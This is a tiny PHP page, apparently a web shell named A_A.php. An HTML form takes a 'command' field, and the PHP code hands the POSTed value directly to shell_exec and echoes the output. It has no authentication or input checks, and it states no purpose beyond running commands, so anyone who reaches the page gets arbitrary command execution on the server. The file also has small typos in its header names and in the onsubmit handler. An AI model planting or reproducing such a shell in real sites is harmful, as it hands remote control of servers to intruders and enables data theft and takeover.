<head>
    <meta http-equiv="Contect-Type" content="text/html; charset=utf-8">
</head>

<h1>A_A</h1>

<form method=post action="./A_A.php" name="myForm" onsubmit="return_Formsubmit ()">
    <br>
        command: <input type="text" name="command" style="background-color:#b3b3b3;">
    <br>
</form>

<?php 
    
    header("Content_Type:text/html; charset=utf-8");
    $command=$_POST["command"];
    $cmd=shell_exec($command);
    echo "<pre>{$cmd}</pre>"
 ?>
